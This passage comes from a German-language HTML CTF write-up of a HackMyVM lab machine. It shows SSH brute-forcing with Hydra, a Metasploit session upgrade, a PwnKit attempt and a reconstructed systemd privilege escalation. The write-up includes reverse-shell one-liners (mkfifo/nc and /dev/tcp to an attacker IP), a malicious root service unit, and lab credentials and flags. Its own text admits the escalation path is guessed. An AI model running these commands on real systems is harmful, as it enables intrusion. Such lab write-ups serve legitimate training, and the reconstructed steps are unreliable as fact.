+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access erreicht! Melden Sie sich mit `ssh joseph@192.168.2.105` und dem Passwort `wealthiest` an.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, komplexe Passwörter, die nicht leicht aus Webseiteninhalten abgeleitet werden können. Implementieren Sie Brute-Force-Schutzmechanismen (z.B. `fail2ban`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">hydra -L userlist.txt -P wordlist.txt ssh://192.168.2.105 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-26 15:17:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 2315 login tries (l:5/p:463), ~37 tries per task
+[DATA] attacking ssh://192.168.2.105:22/
+[22][ssh] host: 192.168.2.105   login: joseph   password: <span class="password">wealthiest</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at [Zeit nicht gezeigt]
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den gefundenen Zugangsdaten (`joseph`:`wealthiest`) wird eine SSH-Verbindung zum Zielsystem aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich. Wir haben eine Shell als Benutzer `joseph` auf dem Zielsystem `elite-economists`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Post-Exploitation-Enumeration als `joseph`. Suchen Sie nach der User-Flag und nach Wegen zur Privilegieneskalation.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort. Analysieren Sie die Kompromittierungskette (anonymer FTP -> Metadaten -> Wortliste -> Brute-Force) und sichern Sie die entsprechenden Punkte ab.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ssh joseph@192.168.2.105</span></div>
+                     <pre>
+The authenticity of host '192.168.2.105 (192.168.2.105)' can't be established.
+ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVrd181pL9rHCLLD0s.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.105' (ED25519) to the list of known hosts.
+joseph@192.168.2.105's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+System information as of Thu 26 Oct 2023 01:20:27 PM UTC
+
+  System load:             0.2
+  Usage of /:              59.8% of 11.21GB
+  Memory usage:            44%
+  Swap usage:              0%
+  Processes:               137
+  Users logged in:         0
+  IPv4 address for enp0s3: 192.168.2.105
+  IPv6 address for enp0s3: 2003:d4:c723:ee95:a00:27ff:fee0:55e3
+
+Expanded Security Maintenance for Applications is not enabled.
+
+51 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+New release '22.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: [Zeit nicht gezeigt]
+                     </pre>
+                      <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command"></span></div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `joseph` wird nach SUID-Dateien gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird eine lange Liste von Standard-SUID-Binaries gefunden. `/usr/bin/at` ist interessant, da es SGID `daemon` ist. Es gibt keine offensichtlich ungewöhnlichen oder leicht ausnutzbaren SUID-Dateien für eine direkte Root-Eskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Standard-Binaries auf GTFOBins. Untersuchen Sie die `/usr/bin/at`-Berechtigung genauer (obwohl `daemon` meist nicht direkt zu Root führt). Suchen Sie nach anderen Vektoren (sudo, Cronjobs, Kernel, Fehlkonfigurationen).<br><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID/SGID-Berechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+[...]
+524759     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
+[...]
+533518    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
+[...]
+                     </pre> <!-- Stark gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Beispiel-Systemd-Unit-Datei wird im Text angezeigt. Sie ist dafür gedacht, eine Reverse Shell als Root zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies deutet darauf hin, dass die Privilegieneskalation wahrscheinlich über das Erstellen und Ausführen eines bösartigen Systemd-Services erfolgte. Es wird jedoch nicht gezeigt, *wie* der Benutzer `joseph` diese Unit-Datei erstellen und aktivieren konnte (fehlende `sudo`-Rechte oder Schreibrechte in Systemverzeichnissen?).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie, wie die Service Unit platziert und aktiviert wurde. Dies ist der entscheidende Schritt der Eskalation.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer keine Systemd-Unit-Dateien in Systemverzeichnissen erstellen oder Dienste ohne Berechtigung starten/aktivieren können. Überprüfen Sie `sudo`-Regeln sorgfältig.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Beispiel Systemd Unit Datei (wahrscheinlich für PE verwendet)
+[Unit]
+Description=This is an example service.
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/home` wird aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt die Home-Verzeichnisse der aus den PDF-Metadaten bekannten Benutzer: `catherine`, `crystal`, `joseph`, `richard`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt die Existenz dieser Benutzer.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">ls ..</span></div> <!-- Annahme: Befehl war 'ls /home/' oder 'cd /home; ls' -->
+                     <pre>catherine  crystal  joseph  richard</pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Text springt zu einer ASCII-Art und einer Flag im HMV-Format. Dies ist wahrscheinlich die User-Flag, die aber zuvor nicht mit `cat user.txt` geholt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag lautet `<span class="password">HMV{37q3p33CsMJgJQbrbYZMUFfTu}</span>`. Es gibt eine Diskrepanz zur endgültigen Flag-Liste am Ende des Dokuments.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie den Befehl zum Auslesen der Flag. Klären Sie die Diskrepanz zwischen dieser Flag und der am Ende genannten User-Flag.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die User-Flag.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+......                .....         .......     ..         .....                ......
+    ........              ...            .......              ....              .......
+       ........                            .........                         ........
+         ...........               ......     ...........               ...........
+            ..............................       ..............................
+                 .....................                ....................
+
+Flag: <span class="password">HMV{37q3p33CsMJgJQbrbYZMUFfTu}</span>
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Metasploit wird verwendet, um eine Reverse Shell zu erhalten und diese zu einer Meterpreter-Sitzung upzugraden. Anschließend wird PwnKit (CVE-2021-4034) versucht und der Local Exploit Suggester ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Meterpreter-Sitzung wird erfolgreich etabliert. Der PwnKit-Exploit schlägt fehl ("not-vulnerable"). Der Suggester findet potenzielle Schwachstellen in `netfilter_priv_esc_ipv4`, `pkexec` (obwohl der Check nicht validieren konnte) und `su_login`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Schritte scheinen nach dem Initial Access, aber vor der (vermuteten) Systemd-PE stattzufinden. Die Suggester-Ergebnisse könnten alternative PE-Pfade bieten, wurden aber anscheinend nicht weiter verfolgt. Der Fokus lag vermutlich auf der Systemd-Methode.<br><strong>Empfehlung (Admin):</strong> Halten Sie Kernel und Pakete (Netfilter, Polkit, Util-linux/su) aktuell. Überwachen Sie Metasploit-Payloads.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">msfconsole -q</span></div>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                     <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                     <pre>lhost => 192.168.2.199</pre> <!-- IP korrigiert -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4545</span></div>
+                     <pre>lport => 4545</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4545
+                     </pre>
+                     <!-- In der joseph-Shell: -->
+                     <!-- joseph@elite-economists:~$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4545 >/tmp/f -->
+                     <pre>
+[*] Command shell session 1 opened (192.168.2.199:4545 -> 192.168.2.105:48772) at 2023-10-26 15:25:59 +0200
+
+Shell Banner:
+$
+
+$ ^Z
+Background session 1? [y/N]  y
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use multi/manage/shell_to_meterpreter</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4477</span></div>
+                     <pre>lport => 4477</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                     <pre>session => 1</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                     <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.199:4477
+[*] Sending stage (1017704 bytes) to 192.168.2.105
+[*] Meterpreter session 2 opened (192.168.2.199:4477 -> 192.168.2.105:36988) at 2023-10-26 15:26:38 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">search 4034</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+[...]
+   1  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation in polkits pkexec
+[...]
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/ms18_8120_win32k_privesc
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use 1</span></div>
+                     <pre>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set session 2</span></div>
+                     <pre>session => 2</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set lport 4473</span></div>
+                     <pre>lport => 4473</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4473
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Verify cleanup of /tmp/.rixhxiv
+[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target does not appear vulnerable "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">search suggester</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">use 0</span></div>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set lport 4473</span></div>
+                     <pre>
+[!] Unknown datastore option: lport.
+lport => 4473
+                     </pre> <!-- Ignorieren, da LPORT für Suggester irrelevant -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                     <pre>session => 2</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                     <pre>
+[*] 192.168.2.105 - Collecting local exploits for x86/linux...
+[*] 192.168.2.105 - 187 exploit checks are being tried...
+[+] 192.168.2.105 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
+[+] 192.168.2.105 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+[+] 192.168.2.105 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[*] Running check method for exploit 58 / 58
+[*] 192.168.2.105 - Valid modules for session 2:
+
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+ 2   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+
+[*] Post module execution completed
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `sudo systemctl status` wird als `joseph` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl zeigt laufende Dienste. Interessant ist der `user@1001.service` (wahrscheinlich für den Benutzer `richard` oder `catherine`) und der Prozess `/tmp/pRcSa`, der in der `session-4.scope` von `joseph` läuft. Dieser Prozess könnte Teil eines Exploits oder einer Persistenzmethode sein. Die Ausgabe `!/bin/bash root@elite-economists:/home/joseph#` am Ende ist fehlplatziert und gehört wahrscheinlich zur Root-Shell nach der Eskalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Prozess `/tmp/pRcSa`. Führen Sie `sudo -l` als `joseph` aus (wurde im Text übersprungen), um zu sehen, ob `systemctl` erlaubt ist, was die Systemd-PE erklären würde.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnliche Prozesse in `/tmp`. Analysieren Sie die `sudo`-Rechte für `joseph`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">sudo systemctl status</span></div>
+                     <pre>
+● elite-economists
+    State: running
+     Jobs: 0 queued
+   Failed: 0 units
+    Since: Thu 2023-10-26 12:30:05 UTC; 1h 1min ago
+[...]
+    │   ├─user@1001.service …
+    │   │ └─init.scope
+    │   │   ├─5453 /lib/systemd/systemd --user
+    │   │   └─5454 (sd-pam)
+    │   └─session-4.scope
+    │     ├─5432 sshd: joseph [priv]
+    │     ├─5533 sshd: joseph@pts/0
+    │     ├─5534 -bash
+    │     ├─6517 /tmp/pRcSa  <-- Interessanter Prozess
+    │     ├─6728 sudo systemctl status
+    │     ├─6729 systemctl status
+    │     └─6730 pager
+[...]
+                     </pre> <!-- Gekürzte und bereinigte Ausgabe -->
+                     <!-- Fehlplatzierte Ausgabe aus Originaltext: -->
+                     <!-- <pre>
+#!/bin/bash
+root@elite-economists:/home/joseph#
+                     </pre> -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nach der (undokumentierten) Privilegieneskalation wird als Root der Inhalt von `/root` aufgelistet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zeigt die `root.txt` und ein `snap`-Verzeichnis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie `root.txt`.<br><strong>Empfehlung (Admin):</strong> Sichern Sie das Root-Verzeichnis.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt root-prompt">root@elite-economists:~# <span class="command">ls</span></div> <!-- Annahme: Prompt für Root -->
+                     <pre>root.txt  snap</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Kommentar, der den erfolgreichen Abschluss der Privilegieneskalation markiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Erlangung von Root-Rechten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Klare Dokumentation des Weges ist wichtig.<br><strong>Empfehlung (Admin):</strong> Fokus auf die Behebung der PE-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Privilege Escalation erfolgreich
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+        <!-- POC Section für Systemd Exploit (Annahme) -->
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung einer (vermuteten) Systemd-Fehlkonfiguration</h2>
+            <p><strong>Kurzbeschreibung:</strong> Basierend auf dem Vorhandensein einer Beispiel-Systemd-Unit-Datei im bereitgestellten Text wird angenommen, dass die Privilegieneskalation durch das Erstellen und Aktivieren eines bösartigen Systemd-Dienstes erfolgte. Dies erfordert, dass der Benutzer `joseph` entweder Schreibrechte in einem Systemd-Verzeichnis (`/etc/systemd/system/`, `/etc/systemd/user/` etc.) hat oder über `sudo`-Rechte verfügt, um Dienste zu verwalten (`systemctl enable`, `systemctl start`). Da der Text diese Details nicht enthält, ist dies eine Rekonstruktion des wahrscheinlichsten Pfades.</p>
+            <p><strong>Voraussetzungen (Annahmen):</strong>
+                <ul>
+                    <li>Zugang zum System als Benutzer `joseph`.</li>
+                    <li>Berechtigung, eine Unit-Datei in einem Systemd-Pfad zu erstellen ODER `systemctl`-Befehle mit `sudo` auszuführen.</li>
+                </ul>
+            </p>
+            <p><strong>Schritt-für-Schritt-Anleitung (Rekonstruiert):</strong></p>
+            <p class="analysis"><strong>Analyse Schritt 1:</strong> Erstellen einer Systemd-Unit-Datei (z.B. `/tmp/revshell.service`) mit einer `ExecStart`-Anweisung, die eine Reverse Shell zum Angreifer startet.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 1:</strong> Die bösartige Service-Definition wird vorbereitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie einen eindeutigen Port für den Listener.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung von Dateien in Systemd-Verzeichnissen.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">cat > /tmp/revshell.service << EOF</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">[Unit]</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">Description=Reverse Shell Service</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> </div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">[Service]</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">User=root</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> </div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">[Install]</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">WantedBy=multi-user.target</span></div>
+                       <div class="prompt remote-prompt" style="color:gray;">> <span class="command">EOF</span></div>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse Schritt 2:</strong> Verschieben oder Kopieren der Unit-Datei in ein Systemd-Verzeichnis (z.B. `/etc/systemd/system/`) und Aktivieren/Starten des Dienstes (erfordert wahrscheinlich `sudo`).</p>
+            <p class="evaluation"><strong>Bewertung Schritt 2:</strong> Wenn erfolgreich, wird der Dienst aktiviert und beim nächsten Start oder sofort ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Listener, bevor Sie den Dienst aktivieren.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie Schreibrechte auf Systemd-Verzeichnisse und `sudo`-Rechte für `systemctl`.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">sudo mv /tmp/revshell.service /etc/systemd/system/revshell.service</span></div>
+                      <pre># (Passworteingabe oder NOPASSWD erforderlich)</pre>
+                      <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">sudo systemctl enable revshell.service</span></div>
+                      <pre># (Erstellt Symlink)</pre>
+                      <div class="prompt remote-prompt">joseph@elite-economists:~$ <span class="command">sudo systemctl start revshell.service</span></div>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse Schritt 3:</strong> Starten eines Netcat-Listeners auf dem Angreifer-System auf dem in der Payload angegebenen Port (hier 4444).</p>
+             <p class="evaluation"><strong>Bewertung Schritt 3:</strong> Der Listener wartet auf die eingehende Verbindung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten Sie auf die Verbindung.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse Schritt 4:</strong> Sobald der Systemd-Dienst startet, wird die Reverse Shell ausgeführt und verbindet sich zum Listener.</p>
+             <p class="evaluation"><strong>Bewertung Schritt 4:</strong> Der Listener empfängt die Verbindung mit Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Exploit erfolgreich.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die unsichere Systemd-Konfiguration oder `sudo`-Regel.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausgabe im Netcat Listener Fenster -->
+                     <pre>
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.105] 51234
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@elite-economists:/# id
+uid=0(root) gid=0(root) groups=0(root)
+                     </pre>
+                      <div class="prompt root-prompt">root@elite-economists:/# <span class="command"></span></div>
+                  </div>
+              </div>
+            <p><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Erlangung einer interaktiven Shell mit root-Berechtigungen.</p>
+            <p><strong>Beweismittel:</strong> Die empfangene Shell mit Root-Kennung (`#` Prompt, `uid=0(root)`) auf dem Netcat-Listener.</p>
+            <p><strong>Risikobewertung:</strong> Hoch. Unsichere Systemd-Berechtigungen oder sudo-Regeln ermöglichen die vollständige Kompromittierung.</p>
+            <p><strong>Empfehlungen:</strong> Stellen Sie sicher, dass nur berechtigte Benutzer Systemd-Dienste erstellen oder verwalten können. Überprüfen Sie `sudo`-Regeln sorgfältig und wenden Sie das Prinzip der geringsten Rechte an.</p>
+        </section>
+
+
+        <section id="flags">
+             <!-- Flag-Container für Zentrierung und Styling -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="comment">Anmerkung: Die Flags wurden direkt am Ende des Textes bereitgestellt. Die User-Flag unterscheidet sich von der zuvor im Text gezeigten Flag.</p>
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/joseph/user.txt</div> <!-- Befehl angenommen -->
+                    <div class="flag-value"><span class="password">HMV{37q3p33CsMJgJQbrbYZMUFfTu}</span></div>
+                </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Befehl angenommen -->
+                    <div class="flag-value"><span class="password">HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}</span></div>
+                </div>
+            </div>
+        </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum extrahiert aus der ersten Nikto Zeitangabe -->
+        <p>Berichtsdatum: 2023-10-26</p>
+    </footer>
+</body>
+</html>
